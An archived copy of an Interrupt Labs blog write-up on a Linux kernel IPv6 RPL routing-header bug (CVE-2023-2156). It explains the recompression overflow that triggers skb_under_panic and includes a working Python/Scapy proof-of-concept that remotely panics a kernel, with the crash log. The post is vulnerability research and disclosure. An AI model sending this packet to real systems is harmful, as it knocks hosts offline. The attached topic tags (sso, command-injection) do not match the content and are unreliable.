---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-05-15_linux-ipv6-route-of-death-0day.md
original_filename: 2023-05-15_linux-ipv6-route-of-death-0day.md
title: Linux IPv6 'Route of Death' 0day
category: documents
detected_topics:
- sso
- command-injection
- api-security
- mobile-security
tags:
- imported
- documents
- sso
- command-injection
- api-security
- mobile-security
language: en
raw_sha256: 72013dfe7711837aa0591f339ad4b49decf2d8aac7b9d898488b1ea0405b13f1
text_sha256: 5264fc68d21ca31aae0603df67c9a4fb9c08c43ea590e0f9479dcf032f079833
ingested_at: '2026-06-28T07:32:21Z'
sensitivity: unknown
redactions_applied: false
---

# Linux IPv6 'Route of Death' 0day

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-05-15_linux-ipv6-route-of-death-0day.md
- Source Type: markdown
- Detected Topics: sso, command-injection, api-security, mobile-security
- Ingested At: 2026-06-28T07:32:21Z
- Redactions Applied: False
- Raw SHA256: `72013dfe7711837aa0591f339ad4b49decf2d8aac7b9d898488b1ea0405b13f1`
- Text SHA256: `5264fc68d21ca31aae0603df67c9a4fb9c08c43ea590e0f9479dcf032f079833`


## Content

---
title: "Linux IPv6 'Route of Death' 0day"
url: "https://www.interruptlabs.co.uk/articles/linux-ipv6-route-of-death"
final_url: "https://www.interruptlabs.co.uk/articles/linux-ipv6-route-of-death"
authors: ["Max VA (@maxpl0it)"]
programs: ["Linux Kernel Organization"]
bugs: ["DoS", "Kernel hacking", "IPv6"]
publication_date: "2023-05-15"
added_date: "2023-05-18"
source: "pentester.land/writeups.json"
original_index: 1156
---

[![Company logo](https://cdn.prod.website-files.com/plugins/Basic/assets/placeholder.60f9b1840c.svg)](/)

[![](https://cdn.prod.website-files.com/6368e0a5421ef1315c8ea989/63692bf728ba31c6520d55c7_Home%20Page%20Logo.webp)](/)

[Home](/)[About us](/about-us)[Labs](/labs)[Careers](https://interruptlabs.teamtailor.com/)[Challenges](/challenges)

![toggle switch](https://cdn.prod.website-files.com/6368e0a5421ef1315c8ea989/63691c81cbb8384a072289a5_Group%20323.webp)

# Linux IPv6 "Route of Death" 0day

by  

Max VA (@maxpl0it)

![](https://cdn.prod.website-files.com/636b7db2bfd4d80c1f5600a7/6461f98f35839e9a51b89fb1_ipv6_route.jpg)

[Back to Labs](/labs)

May

2023

### Introduction

Sometimes I feel like exploring random areas of code. It's a pretty good way to find a new bug pattern. Early last year I was doing just that, prodding around the Linux Kernel source, and came across something neat.

### Something Neat

The linux kernel handles network data in a structure called an **_sk_buff_** (Socket Buffer). The structure contains a LOT of information, but the important members are these:

  * _Head_ \- A pointer to a block of memory containing the packet data
  *  _Data_ \- A pointer to the start of the data to be parsed (There could be padding before the data, or already-parsed data)
  * _Tail_ \- An offset to the end of the packet data in the region
  *  _End_ \- An offset to the end of the allocated block of memory
  *  _Len_ \- The distance between the Data pointer and the tail offset

It looks a little like this:

![](https://cdn.prod.website-files.com/636b7db2bfd4d80c1f5600a7/64411451defa5c079891c38c_Screenshot%202023-04-20%20at%2011.30.32.png)

The SKB structure (although the members are reordered to make it clearer)

In order to interract with this data structure, a number of functions are used, including:

  * **_skb_push_** (Adds data to the start of the buffer by subtracting from the data pointer)
  * **_skb_pull_** (Removes data from the start of the buffer by adding to the data pointer)

**_skb_push_** has a bit of code that prevents it from going outside the bounds of the allocated buffer:  
  
‍
  
  
  void *skb_push(struct sk_buff *skb, unsigned int len) {
  skb->data -= len;
  skb->len  += len;
  if (unlikely(skb->data < skb->head))
  skb_under_panic(skb, len, __builtin_return_address(0));
  return skb->data;
  }

‍  
  
If the amount of space we're adding to the start of the buffer is more than we have allocated, then it'll cause a kernel panic instead of continuing execution.  
This means that any vulnerabilities that would ordinarily cause out-of-bounds behaviour (the good stuff) are now reduced to denial-of-service bugs.

While a denial-of-service bug may seem boring, the "remote" aspect usually associated with **_sk_buffs_** make them still pretty interesting. A remote kernel panic is still pretty fun!

I found an instance of this issue type in the IPv6 code for handling Routing headers. More specifically, the Routing Protocol for Low-Power and Lossy Networks (RPL Source Routing - **_RFCs 6550_** to **_6554_**).

### Routing and RPL

Network protocols are stupidly complex. Ever looked at the RFC for TCP? Absolutely disgusting.  
Fortunately for terrible people such as myself, complexity paves the road for bugs.

IPv6 has the concept of optional Extension Headers which contain information about the packet, how it's configured, and where it needs to go to. One category of header is the Routing header which allows packets to list a series of IPv6 devices the packet should pass through. The base structure of the Routing header is as so:  
‍

![](https://cdn.prod.website-files.com/636b7db2bfd4d80c1f5600a7/644109698f87a7ee0a4fb32c_Screenshot%202023-04-20%20at%2010.43.55.png)

The Routing Header layout from RFC 8200

‍

As shown above, there is a **_Routing Type_** member. This affects the format of the type-specific data.  
A number of Routing Types are usable:

  * 0 - A deprecated type (Deprecated due to it allowing denial-of-services)
  * 1 - Another deprecated type used for Nimrod routing (**_RFC 1992_**)
  * 2 - Used for Mobile IPv6
  * 3 - Used for RPL Source Routing
  * 4 - Used for Segment Routing

Since the vulnerability itself resides in the implementation of RPL, **_Type 3_** is what's important here.  
The full RPL header is structured as so:

‍

![](https://cdn.prod.website-files.com/636b7db2bfd4d80c1f5600a7/644109c7864f4978fed9f127_Screenshot%202023-04-20%20at%2010.45.24.png)

The RPL Header Structure from RFC 6554

‍

RPL Source Routing also allows for the compression of addresses (**_RFC 6554_**) using the **_CmprI_** and **_CmprE_** parameters. These values say how many octets of the destination address are the same as all the addresses in the vector (and can thus be ommitted for each address in the vector).

The reason for this is that it's likely that RPL will be used in local networks where the most significant octets of all the addresses will be the same (which would be quite wasteful to transport).  
The **_CmprI_** value says how many octets to omit for all the addresses except the last address in the vector, and the **_CmprE_** value says how many octets to omit for the final address in the vector.

When the packet arrives at the next node, it needs to decompress the addresses for several reasons:

  * It needs to verify that there are no loops in the list of addresses
  * It needs to update the destination address of the IPv6 packet to the next address in the list and then recompress the vector based on this new destination address  

The process for receiving an RPL packet is therefore:

  1. Decompress all the addresses in the vector by attaching the **_CmprI_** _/_**_CmprE_** least significant octets from the addresses in the vector, to the most significant octets of the destination address
  2. Check for loops in the addresses vector
  3. Swap the destination address of the packet with **_Addresses[n - segments_left - 1]_** (where n is the number of addresses in the vector, as shown above)
  4. Recompress the addresses in the vector against the new destination address
  5. Forward the packet on

### The Bug

Because of the way this standard works, it's possible to cause an amplification attack in the case where **_segments_left_** is 1:  
If I have a **_CmprI_** value of 15 (So each address in the vector will only contain a single byte), but have a **_CmprE_** value of 0 (so the final address in the vector contains the full 16 bytes), then when the final address in the vector becomes the destination address (as would happen when **_segments_left == 1_**), it may not be possible to recompress all the addresses.

This means that an addresses vector that is 48 bytes long (32x1-byte addresses and 1x16-byte address) the addresses vector recompresses to 528 before being forwarded onto the next machine.

Interestingly, this expansion is where the underlying bug in the code is.

In the Linux Kernel, the function that performs RPL and calls the decompression/compression routines is **_ipv6_rpl_srh_rcv_**. When it comes to decompressing the addresses vector, a buffer is allocated for it:  

  
  
  buf = kcalloc(struct_size(hdr, segments.addr, n + 2), 2, GFP_ATOMIC);
  
  /* ... */
  
  ipv6_rpl_srh_decompress(ohdr, hdr, &ipv6_hdr(skb)->daddr, n);

The destination address is then swapped with the next one (and the original destination address is stored in-place in the addresses vector):
  
  
  swap(ipv6_hdr(skb)->daddr, ohdr->rpl_segaddr[i]);

Following this, the addresses vector is then re-compressed against the new destination address:
  
  
  ipv6_rpl_srh_compress(chdr, ohdr, &ipv6_hdr(skb)->daddr, n);

The SKB is then re-used for the forwarding by copying the re-compressed data into it, as well as resetting and rebuilding the headers:
  
  
  oldhdr = ipv6_hdr(skb);
  skb_pull(skb, ((hdr->hdrlen + 1) << 3));
  skb_postpull_rcsum(skb, oldhdr, sizeof(struct ipv6hdr) + ((hdr->hdrlen + 1) << 3));
  skb_push(skb, ((chdr->hdrlen + 1) << 3) + sizeof(struct ipv6hdr));
  skb_reset_network_header(skb);
  skb_mac_header_rebuild(skb);
  skb_set_transport_header(skb, sizeof(struct ipv6hdr));
  memmove(ipv6_hdr(skb), oldhdr, sizeof(struct ipv6hdr));
  memcpy(skb_transport_header(skb), chdr, (chdr->hdrlen + 1) << 3);

The big problem here is the call to **_skb_push_** , which tries to add space to the head of the skb for the addresses vector.  
In the example mentioned earlier, we changed 48 bytes into 528. If there are not 528 bytes to spare in the head of the SKB, then it will cause the data pointer to be below the head pointer and cause a kernel panic.

### Proof-of-Concept

It's possible to trigger this on a machine with RPL enabled (**_sysctl -a | grep -i rpl_seg_enabled_**) with the following code:  

  
  
  # We'll use Scapy to craft the packet
  from scapy.all import *
  import socket
  
  # Use the IPv6 from your LAN interface
  DST_ADDR = sys.argv[1]
  SRC_ADDR = DST_ADDR
  
  # We use sockets to send the packet since sending with scapy wasn't working (And I'm far too lazy to debug things)
  sockfd = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_RAW)
  
  # Craft the packet
  #  Type = 3 makes this an RPL packet
  #  Addresses contains 3 addresses, but because CmprI is 15, each octet of the first two addresses is treated as a compressed address (So technically there are 16 compressed addresses)
  #  Segleft = 1 to trigger the amplification
  #  lastentry = 0xf0 sets CmprI to 15 and CmprE to 0
  p = IPv6(src=SRC_ADDR, dst=DST_ADDR) / IPv6ExtHdrSegmentRouting(type=3, addresses=["a8::", "a7::", "a6::"], segleft=1, lastentry=0xf0)
  
  # Send this evil packet
  sockfd.sendto(bytes(p), (DST_ADDR, 0))

This causes the a lovely little kernel panic:
  
  
  [  53.385136] skbuff: skb_under_panic: text:ffffffff81c89927 len:576 put:576 he
  [  53.385601] kernel BUG at net/core/skbuff.c:112!
  [  53.386005] invalid opcode: 0000 [#1] SMP NOPTI
  [  53.386144] CPU: 0 PID: 727 Comm: python3 Not tainted 5.15.0-69-generic #76-U
  [  53.386260] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1
  [  53.386471] RIP: 0010:skb_panic+0x4f/0x51
  [  53.386715] Code: 48 70 57 8b b8 bc 00 00 00 57 8b b8 b8 00 00 00 57 48 c7 c7
  [  53.386955] RSP: 0018:ffffc90000003c40 EFLAGS: 00000246
  [  53.387049] RAX: 0000000000000084 RBX: ffff888101de0438 RCX: 0000000000000000
  [  53.387138] RDX: 0000000000000000 RSI: ffff88813bc20580 RDI: ffff88813bc20580
  [  53.387228] RBP: ffffc90000003c60 R08: 0000000000000003 R09: 61705f7265646e75
  [  53.387316] R10: 0000000075626b73 R11: 0000000075626b73 R12: ffff888103eb3800
  [  53.387407] R13: ffff888103eb3a18 R14: ffff888101e58e00 R15: ffff888101de0410
  [  53.387538] FS:  00007f9f71ba7000(0000) GS:ffff88813bc00000(0000) knlGS:00000
  [  53.387639] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
  [  53.387719] CR2: 00007f9f6faa9030 CR3: 0000000101768000 CR4: 00000000000006f0
  [  53.387928] Call Trace:
  [  53.388258]  <IRQ>
  [  53.388373]  skb_push.cold+0x14/0x14
  [  53.388537]  ipv6_rpl_srh_rcv+0x2d7/0x9a0
  [  53.388612]  ipv6_rthdr_rcv+0x323/0x5c0
  [  53.388671]  ? update_load_avg+0x82/0x620
  [  53.388737]  ip6_protocol_deliver_rcu+0x47a/0x570
  [  53.388808]  ip6_input+0xb6/0xd0
  [  53.388860]  ? ip6_rcv_core+0x350/0x550
  [  53.388921]  ipv6_rcv+0x134/0x170
  [  53.388973]  ? task_tick_fair+0x382/0x5a0
  [  53.389032]  ? sched_clock_cpu+0x12/0xf0
  [  53.389094]  __netif_receive_skb_one_core+0x64/0xa0
  [  53.389168]  __netif_receive_skb+0x15/0x60
  [  53.389229]  process_backlog+0x9e/0x170
  [  53.389290]  __napi_poll+0x33/0x180
  [  53.389346]  net_rx_action+0x126/0x280
  [  53.389406]  ? clockevents_program_event+0xad/0x130
  [  53.389483]  __do_softirq+0xd9/0x2e7
  [  53.389546]  do_softirq+0x7d/0xb0
  [  53.389639]  </IRQ>
  [  53.389678]  <TASK>
  [  53.389713]  __local_bh_enable_ip+0x54/0x60
  [  53.389776]  ip6_finish_output2+0x1ef/0x590
  [  53.389845]  __ip6_finish_output+0xea/0x2b0
  [  53.389909]  ip6_finish_output+0x2e/0xc0
  [  53.389970]  ip6_output+0x75/0x130
  [  53.390024]  ? __ip6_finish_output+0x2b0/0x2b0
  [  53.390089]  rawv6_send_hdrinc+0x30b/0x580
  [  53.390155]  ? xfrm_lookup_route+0x24/0xc0
  [  53.390222]  rawv6_sendmsg+0x46e/0x990
  [  53.390279]  ? atime_needs_update+0x104/0x180
  [  53.390352]  ? kernel_init_free_pages.part.0+0x4a/0x70
  [  53.390424]  ? get_page_from_freelist+0x353/0x540
  [  53.390502]  inet_sendmsg+0x74/0x80
  [  53.390557]  ? rawv6_send_hdrinc+0x580/0x580
  [  53.390621]  ? inet_sendmsg+0x74/0x80
  [  53.390677]  sock_sendmsg+0x62/0x70
  [  53.390733]  __sys_sendto+0x113/0x190
  [  53.390805]  ? __schedule+0x435/0x590
  [  53.390865]  __x64_sys_sendto+0x24/0x30
  [  53.390924]  do_syscall_64+0x5c/0xc0
  [  53.390980]  ? schedule+0x69/0x110
  [  53.391034]  ? exit_to_user_mode_loop+0x7e/0x160
  [  53.391103]  ? exit_to_user_mode_prepare+0x37/0xb0
  [  53.391171]  ? irqentry_exit_to_user_mode+0x9/0x20
  [  53.391238]  ? irqentry_exit+0x1d/0x30
  [  53.391294]  ? sysvec_apic_timer_interrupt+0x4e/0x90
  [  53.391365]  entry_SYSCALL_64_after_hwframe+0x61/0xcb
  [  53.391482] RIP: 0033:0x7f9f71ccfbba
  [  53.391675] Code: d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 f3 0f 1e fa
  [  53.391887] RSP: 002b:00007ffc84db1028 EFLAGS: 00000246 ORIG_RAX: 00000000000
  [  53.391995] RAX: ffffffffffffffda RBX: 00007ffc84db10d8 RCX: 00007f9f71ccfbba
  [  53.392085] RDX: 0000000000000060 RSI: 00007f9f6fab1250 RDI: 0000000000000003
  [  53.392174] RBP: 0000000000000000 R08: 00007ffc84db1150 R09: 000000000000001c
  [  53.392263] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
  [  53.392353] R13: ffffffffc4653600 R14: 00007ffc84db10d8 R15: 0000000000000001
  [  53.392463]  </TASK>
  [  53.392528] Modules linked in: scsi_dh_rdac scsi_dh_emc scsi_dh_alua drm btrf
  [  53.393435] ---[ end trace addf09f76fdcafaa ]---
  [  53.393520] RIP: 0010:skb_panic+0x4f/0x51
  [  53.393580] Code: 48 70 57 8b b8 bc 00 00 00 57 8b b8 b8 00 00 00 57 48 c7 c7
  [  53.393780] RSP: 0018:ffffc90000003c40 EFLAGS: 00000246
  [  53.393850] RAX: 0000000000000084 RBX: ffff888101de0438 RCX: 0000000000000000
  [  53.393935] RDX: 0000000000000000 RSI: ffff88813bc20580 RDI: ffff88813bc20580
  [  53.394020] RBP: ffffc90000003c60 R08: 0000000000000003 R09: 61705f7265646e75
  [  53.394105] R10: 0000000075626b73 R11: 0000000075626b73 R12: ffff888103eb3800
  [  53.394189] R13: ffff888103eb3a18 R14: ffff888101e58e00 R15: ffff888101de0410
  [  53.394276] FS:  00007f9f71ba7000(0000) GS:ffff88813bc00000(0000) knlGS:00000
  [  53.394372] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
  [  53.394442] CR2: 00007f9f6faa9030 CR3: 0000000101768000 CR4: 00000000000006f0
  [  53.394598] Kernel panic - not syncing: Fatal exception in interrupt
  [  53.394957] Kernel Offset: disabled
  [  53.395086] ---[ end Kernel panic - not syncing: Fatal exception in interrupt

### Report

I reported this bug through the Zero Day Initiative([**_ZDI-23-547_**](https://www.zerodayinitiative.com/advisories/ZDI-23-547/)). It was assigned **_CVE-2023-2156_** but the bug patch didn't solve the underlying problem (ZDI confirmed this too), so we're still expecting another patch at somepoint. However, it has now been released as an 0day. Massive props to ZDI for relentlessly chasing up the fix over the past year.

[Back to Labs](/labs)

![](https://cdn.prod.website-files.com/6368e0a5421ef1315c8ea989/637f8a75e92e679da8ea6d49_Sticky_Arrow.png)

[![](https://cdn.prod.website-files.com/plugins/Basic/assets/placeholder.60f9b1840c.svg)](/)

![](https://cdn.prod.website-files.com/6368e0a5421ef1315c8ea989/636a76fc61e0e41988f7fd33_Group%20202.webp)

[![](https://cdn.prod.website-files.com/plugins/Basic/assets/placeholder.60f9b1840c.svg)](/)

###### Navigation

[Home](/)[About us](/about-us)[Labs](/labs)Careers[Challenges](/challenges)

###### Contact us

Interrupt Labs

Matrix House

Basing View

Basingstoke

RG21 4FF

[info@interruptlabs.co.uk](mailto:info@interruptlabs.co.uk)

###### Follow us

[![Linkedin logo](https://cdn.prod.website-files.com/plugins/Basic/assets/placeholder.60f9b1840c.svg)](https://uk.linkedin.com/company/interrupt-labs)[![Twitter logo](https://cdn.prod.website-files.com/plugins/Basic/assets/placeholder.60f9b1840c.svg)](https://twitter.com/interruptlabs)[![Twitter logo](https://cdn.prod.website-files.com/plugins/Basic/assets/placeholder.60f9b1840c.svg)](https://bsky.app/profile/interruptlabs.bsky.social)

###### Quick Links

Privacy policy[Cookie policy](/cookie-policy)[Modern slavery statement](/modern-slavery-statement)[Terms of use](/terms-of-use)

© Copyright Interrupt Labs 

Please click on "Preferences" to confirm your cookie preferences. By default, the essential cookies are always activated. View our [Cookie Policy](/cookie-policy) for more information.

Preferences

Privacy Preference Centre

When you visit websites, they may store or retrieve data in your browser. This storage is often necessary for the basic functionality of the website. The storage may be used for analytics such as storing your preferences. Privacy is important to us, so you have the option of disabling certain types of storage that may not be necessary for the basic functioning of the website. Blocking categories may impact your experience on the website.

Reject all cookies

Manage Consent Preferences by Category

Essential

**Always Active**

These items are required to enable basic website functionality.

Analytics

Essential

These items help the website operator understand how its website performs, how visitors interact with the site, and whether there may be technical issues. This storage type usually doesn’t collect information that identifies a visitor.

Confirm my preferences and close
